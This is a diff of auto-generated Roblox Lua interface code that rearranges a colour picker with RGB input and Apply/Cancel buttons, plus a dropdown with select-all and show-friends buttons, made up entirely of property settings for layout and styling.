-G2L["2c9"]["Visible"] = false;
-G2L["2c9"]["BorderSizePixel"] = 0;
-G2L["2c9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2c9"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2c9"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["2c9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2c9"]["Name"] = [[buttonFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display.buttonFade.UIGradient
-G2L["2ca"] = Instance.new("UIGradient", G2L["2c9"]);
-G2L["2ca"]["Rotation"] = 90;
-G2L["2ca"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display.text
-G2L["2cb"] = Instance.new("UIStroke", G2L["2c8"]);
-G2L["2cb"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends
-G2L["2cc"] = Instance.new("TextButton", G2L["2c7"]);
-G2L["2cc"]["TextSize"] = 12;
-G2L["2cc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2cc"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
-G2L["2cc"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["2cc"]["Size"] = UDim2.new(0.5, 0, 1, 0);
-G2L["2cc"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["2cc"]["Text"] = [[Show Friends]];
-G2L["2cc"]["Name"] = [[friends]];
-G2L["2cc"]["Position"] = UDim2.new(0.5, 0, 0, 0);
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends.buttonFade
-G2L["2cd"] = Instance.new("CanvasGroup", G2L["2cc"]);
-G2L["2cd"]["Visible"] = false;
-G2L["2cd"]["BorderSizePixel"] = 0;
-G2L["2cd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2cd"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2cd"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["2cd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2cd"]["Name"] = [[buttonFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends.buttonFade.UIGradient
-G2L["2ce"] = Instance.new("UIGradient", G2L["2cd"]);
-G2L["2ce"]["Rotation"] = 90;
-G2L["2ce"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends.text
-G2L["2cf"] = Instance.new("UIStroke", G2L["2cc"]);
-G2L["2cf"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling
-G2L["2d0"] = Instance.new("ScrollingFrame", G2L["2bc"]);
-G2L["2d0"]["Active"] = true;
-G2L["2d0"]["ZIndex"] = 999999999;
+G2L["2d0"] = Instance.new("Frame", G2L["2c7"]);
 G2L["2d0"]["BorderSizePixel"] = 0;
-G2L["2d0"]["Name"] = [[dropdownScrolling]];
 G2L["2d0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2d0"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["2d0"]["Size"] = UDim2.new(1, 0, 0.2, 0);
-G2L["2d0"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2d0"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["2d0"]["ScrollBarThickness"] = 0;
+G2L["2d0"]["Size"] = UDim2.new(1, -100, 1, 0);
+G2L["2d0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2d0"]["Name"] = [[rgb]];
+G2L["2d0"]["LayoutOrder"] = 1;
 G2L["2d0"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.UIListLayout
-G2L["2d1"] = Instance.new("UIListLayout", G2L["2d0"]);
-G2L["2d1"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.UIPadding
+G2L["2d1"] = Instance.new("UIPadding", G2L["2d0"]);
+G2L["2d1"]["PaddingTop"] = UDim.new(0, 2);
+G2L["2d1"]["PaddingRight"] = UDim.new(0, 3);
+G2L["2d1"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["2d1"]["PaddingBottom"] = UDim.new(0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button
-G2L["2d2"] = Instance.new("TextButton", G2L["2d0"]);
-G2L["2d2"]["TextTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox
+G2L["2d2"] = Instance.new("TextBox", G2L["2d0"]);
+G2L["2d2"]["Name"] = [[textbox]];
+G2L["2d2"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["2d2"]["PlaceholderColor3"] = Color3.fromRGB(201, 201, 201);
+G2L["2d2"]["TextWrapped"] = true;
 G2L["2d2"]["TextSize"] = 14;
-G2L["2d2"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2d2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["2d2"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["2d2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2d2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["2d2"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["2d2"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["2d2"]["PlaceholderText"] = [[RGB color]];
+G2L["2d2"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["2d2"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["2d2"]["Name"] = [[button]];
+G2L["2d2"]["Text"] = [[]];
 
 
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.image
-G2L["2d3"] = Instance.new("ImageLabel", G2L["2d2"]);
-G2L["2d3"]["ZIndex"] = 99;
-G2L["2d3"]["BorderSizePixel"] = 0;
-G2L["2d3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2d3"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
-G2L["2d3"]["Size"] = UDim2.new(0, 20, 1, 0);
-G2L["2d3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2d3"]["BackgroundTransparency"] = 1;
-G2L["2d3"]["Name"] = [[image]];
-G2L["2d3"]["Position"] = UDim2.new(1, -20, 0, 0);
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.outlineStroke
+G2L["2d3"] = Instance.new("UIStroke", G2L["2d2"]);
+G2L["2d3"]["ZIndex"] = 10;
+G2L["2d3"]["Thickness"] = 2;
+G2L["2d3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["2d3"]["Name"] = [[outlineStroke]];
 
 
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.text
-G2L["2d4"] = Instance.new("TextLabel", G2L["2d2"]);
-G2L["2d4"]["ZIndex"] = 10;
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.buttonFade
+G2L["2d4"] = Instance.new("CanvasGroup", G2L["2d2"]);
 G2L["2d4"]["BorderSizePixel"] = 0;
-G2L["2d4"]["TextSize"] = 14;
-G2L["2d4"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 G2L["2d4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2d4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["2d4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2d4"]["BackgroundTransparency"] = 1;
+G2L["2d4"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["2d4"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["2d4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2d4"]["Name"] = [[text]];
+G2L["2d4"]["Name"] = [[buttonFade]];
 
 
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.text.UIPadding
-G2L["2d5"] = Instance.new("UIPadding", G2L["2d4"]);
-G2L["2d5"]["PaddingLeft"] = UDim.new(0, 6);
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.buttonFade.UIGradient
+G2L["2d5"] = Instance.new("UIGradient", G2L["2d4"]);
+G2L["2d5"]["Rotation"] = 90;
+G2L["2d5"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.text.text
-G2L["2d6"] = Instance.new("UIStroke", G2L["2d4"]);
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.text
+G2L["2d6"] = Instance.new("UIStroke", G2L["2d2"]);
 G2L["2d6"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.buttonFade
-G2L["2d7"] = Instance.new("CanvasGroup", G2L["2d2"]);
-G2L["2d7"]["Visible"] = false;
-G2L["2d7"]["BorderSizePixel"] = 0;
-G2L["2d7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2d7"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2d7"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["2d7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["2d7"]["Name"] = [[buttonFade]];
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.UIPadding
+G2L["2d7"] = Instance.new("UIPadding", G2L["2d2"]);
+G2L["2d7"]["PaddingLeft"] = UDim.new(0, 6);
 
 
--- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.buttonFade.UIGradient
-G2L["2d8"] = Instance.new("UIGradient", G2L["2d7"]);
-G2L["2d8"]["Rotation"] = 90;
-G2L["2d8"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.UIListLayout
+G2L["2d8"] = Instance.new("UIListLayout", G2L["2c7"]);
+G2L["2d8"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+G2L["2d8"]["FillDirection"] = Enum.FillDirection.Horizontal;
 
 
--- StarterGui.T5784YHRGE89ES98T.CanvasGroup
-G2L["2d9"] = Instance.new("CanvasGroup", G2L["1"]);
-G2L["2d9"]["Visible"] = false;
-G2L["2d9"]["ZIndex"] = 1999999999;
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel
+G2L["2d9"] = Instance.new("Frame", G2L["2ad"]);
 G2L["2d9"]["BorderSizePixel"] = 0;
 G2L["2d9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["2d9"]["Size"] = UDim2.new(0, 450, 0, 80);
-G2L["2d9"]["Position"] = UDim2.new(0.75448, 0, 0.67079, 0);
+G2L["2d9"]["Size"] = UDim2.new(1, 0, 0, 23);
 G2L["2d9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2d9"]["Name"] = [[applycancel]];
+G2L["2d9"]["LayoutOrder"] = 5;
 G2L["2d9"]["BackgroundTransparency"] = 1;
 
 
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.UIListLayout
+G2L["2da"] = Instance.new("UIListLayout", G2L["2d9"]);
+G2L["2da"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+G2L["2da"]["FillDirection"] = Enum.FillDirection.Horizontal;
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply
+G2L["2db"] = Instance.new("TextButton", G2L["2d9"]);
+G2L["2db"]["BorderSizePixel"] = 0;
+G2L["2db"]["TextTransparency"] = 1;
+G2L["2db"]["TextSize"] = 14;
+G2L["2db"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2db"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2db"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2db"]["BackgroundTransparency"] = 1;
+G2L["2db"]["Size"] = UDim2.new(0, 100, 1, 0);
+G2L["2db"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2db"]["Name"] = [[apply]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.UIPadding
+G2L["2dc"] = Instance.new("UIPadding", G2L["2db"]);
+G2L["2dc"]["PaddingTop"] = UDim.new(0, 2);
+G2L["2dc"]["PaddingRight"] = UDim.new(0, 3);
+G2L["2dc"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["2dc"]["PaddingBottom"] = UDim.new(0, 2);
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.buttonFrame
+G2L["2dd"] = Instance.new("Frame", G2L["2db"]);
+G2L["2dd"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["2dd"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["2dd"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2dd"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["2dd"]["Name"] = [[buttonFrame]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.buttonFrame.outlineStroke
+G2L["2de"] = Instance.new("UIStroke", G2L["2dd"]);
+G2L["2de"]["ZIndex"] = 10;
+G2L["2de"]["Thickness"] = 2;
+G2L["2de"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.text
+G2L["2df"] = Instance.new("TextLabel", G2L["2db"]);
+G2L["2df"]["ZIndex"] = 2;
+G2L["2df"]["BorderSizePixel"] = 0;
+G2L["2df"]["TextSize"] = 14;
+G2L["2df"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2df"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2df"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2df"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2df"]["BackgroundTransparency"] = 1;
+G2L["2df"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2df"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2df"]["Text"] = [[Apply]];
+G2L["2df"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.text.text
+G2L["2e0"] = Instance.new("UIStroke", G2L["2df"]);
+G2L["2e0"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel
+G2L["2e1"] = Instance.new("TextButton", G2L["2d9"]);
+G2L["2e1"]["BorderSizePixel"] = 0;
+G2L["2e1"]["TextTransparency"] = 1;
+G2L["2e1"]["TextSize"] = 14;
+G2L["2e1"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2e1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2e1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2e1"]["BackgroundTransparency"] = 1;
+G2L["2e1"]["Size"] = UDim2.new(0, 100, 1, 0);
+G2L["2e1"]["LayoutOrder"] = 1;
+G2L["2e1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2e1"]["Name"] = [[cancel]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.UIPadding
+G2L["2e2"] = Instance.new("UIPadding", G2L["2e1"]);
+G2L["2e2"]["PaddingTop"] = UDim.new(0, 2);
+G2L["2e2"]["PaddingRight"] = UDim.new(0, 3);
+G2L["2e2"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["2e2"]["PaddingBottom"] = UDim.new(0, 2);
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame
+G2L["2e3"] = Instance.new("Frame", G2L["2e1"]);
+G2L["2e3"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["2e3"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["2e3"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2e3"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["2e3"]["Name"] = [[buttonFrame]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame.outlineStroke
+G2L["2e4"] = Instance.new("UIStroke", G2L["2e3"]);
+G2L["2e4"]["ZIndex"] = 10;
+G2L["2e4"]["Thickness"] = 2;
+G2L["2e4"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame.buttonFade
+G2L["2e5"] = Instance.new("CanvasGroup", G2L["2e3"]);
+G2L["2e5"]["BorderSizePixel"] = 0;
+G2L["2e5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2e5"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2e5"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2e5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2e5"]["Name"] = [[buttonFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame.buttonFade.UIGradient
+G2L["2e6"] = Instance.new("UIGradient", G2L["2e5"]);
+G2L["2e6"]["Rotation"] = 90;
+G2L["2e6"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.text
+G2L["2e7"] = Instance.new("TextLabel", G2L["2e1"]);
+G2L["2e7"]["ZIndex"] = 2;
+G2L["2e7"]["BorderSizePixel"] = 0;
+G2L["2e7"]["TextSize"] = 14;
+G2L["2e7"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2e7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2e7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2e7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2e7"]["BackgroundTransparency"] = 1;
+G2L["2e7"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2e7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2e7"]["Text"] = [[Cancel]];
+G2L["2e7"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.text.text
+G2L["2e8"] = Instance.new("UIStroke", G2L["2e7"]);
+G2L["2e8"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.colorpickerFade
+G2L["2e9"] = Instance.new("CanvasGroup", G2L["2ab"]);
+G2L["2e9"]["BorderSizePixel"] = 0;
+G2L["2e9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2e9"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2e9"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2e9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2e9"]["Name"] = [[colorpickerFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.ColorPicker.colorpickerFade.UIGradient
+G2L["2ea"] = Instance.new("UIGradient", G2L["2e9"]);
+G2L["2ea"]["Rotation"] = 90;
+G2L["2ea"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown
+G2L["2eb"] = Instance.new("Frame", G2L["1"]);
+G2L["2eb"]["Visible"] = false;
+G2L["2eb"]["ZIndex"] = 1000000010;
+G2L["2eb"]["BorderSizePixel"] = 0;
+G2L["2eb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2eb"]["Size"] = UDim2.new(0, 162, 0, 100);
+G2L["2eb"]["Position"] = UDim2.new(0.60349, 0, 0.36966, 0);
+G2L["2eb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2eb"]["Name"] = [[Dropdown]];
+G2L["2eb"]["BackgroundTransparency"] = 0.99;
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.UIListLayout
+G2L["2ec"] = Instance.new("UIListLayout", G2L["2eb"]);
+G2L["2ec"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll
+G2L["2ed"] = Instance.new("Frame", G2L["2eb"]);
+G2L["2ed"]["BorderSizePixel"] = 0;
+G2L["2ed"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2ed"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["2ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2ed"]["Name"] = [[dropdownSelectAll]];
+G2L["2ed"]["LayoutOrder"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall
+G2L["2ee"] = Instance.new("TextButton", G2L["2ed"]);
+G2L["2ee"]["TextSize"] = 12;
+G2L["2ee"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2ee"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
+G2L["2ee"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2ee"]["Size"] = UDim2.new(0.5, 0, 1, 0);
+G2L["2ee"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["2ee"]["Text"] = [[Select All]];
+G2L["2ee"]["Name"] = [[selectall]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall.buttonFade
+G2L["2ef"] = Instance.new("CanvasGroup", G2L["2ee"]);
+G2L["2ef"]["Visible"] = false;
+G2L["2ef"]["BorderSizePixel"] = 0;
+G2L["2ef"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2ef"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2ef"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2ef"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2ef"]["Name"] = [[buttonFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall.buttonFade.UIGradient
+G2L["2f0"] = Instance.new("UIGradient", G2L["2ef"]);
+G2L["2f0"]["Rotation"] = 90;
+G2L["2f0"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall.text
+G2L["2f1"] = Instance.new("UIStroke", G2L["2ee"]);
+G2L["2f1"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall
+G2L["2f2"] = Instance.new("TextButton", G2L["2ed"]);
+G2L["2f2"]["TextSize"] = 12;
+G2L["2f2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f2"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
+G2L["2f2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f2"]["Size"] = UDim2.new(0.5, 0, 1, 0);
+G2L["2f2"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["2f2"]["Text"] = [[Unselect All]];
+G2L["2f2"]["Name"] = [[unselectall]];
+G2L["2f2"]["Position"] = UDim2.new(0.5, 0, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall.buttonFade
+G2L["2f3"] = Instance.new("CanvasGroup", G2L["2f2"]);
+G2L["2f3"]["Visible"] = false;
+G2L["2f3"]["BorderSizePixel"] = 0;
+G2L["2f3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f3"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f3"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2f3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f3"]["Name"] = [[buttonFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall.buttonFade.UIGradient
+G2L["2f4"] = Instance.new("UIGradient", G2L["2f3"]);
+G2L["2f4"]["Rotation"] = 90;
+G2L["2f4"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall.text
+G2L["2f5"] = Instance.new("UIStroke", G2L["2f2"]);
+G2L["2f5"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers
+G2L["2f6"] = Instance.new("Frame", G2L["2eb"]);
+G2L["2f6"]["BorderSizePixel"] = 0;
+G2L["2f6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f6"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["2f6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f6"]["Name"] = [[dropdownUsers]];
+G2L["2f6"]["LayoutOrder"] = 2;
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display
+G2L["2f7"] = Instance.new("TextButton", G2L["2f6"]);
+G2L["2f7"]["TextWrapped"] = true;
+G2L["2f7"]["TextSize"] = 12;
+G2L["2f7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f7"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
+G2L["2f7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f7"]["Size"] = UDim2.new(0.5, 0, 1, 0);
+G2L["2f7"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["2f7"]["Text"] = [[Show Display]];
+G2L["2f7"]["Name"] = [[display]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display.buttonFade
+G2L["2f8"] = Instance.new("CanvasGroup", G2L["2f7"]);
+G2L["2f8"]["Visible"] = false;
+G2L["2f8"]["BorderSizePixel"] = 0;
+G2L["2f8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f8"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f8"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["2f8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f8"]["Name"] = [[buttonFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display.buttonFade.UIGradient
+G2L["2f9"] = Instance.new("UIGradient", G2L["2f8"]);
+G2L["2f9"]["Rotation"] = 90;
+G2L["2f9"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display.text
+G2L["2fa"] = Instance.new("UIStroke", G2L["2f7"]);
+G2L["2fa"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends
+G2L["2fb"] = Instance.new("TextButton", G2L["2f6"]);
+G2L["2fb"]["TextSize"] = 12;
+G2L["2fb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2fb"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
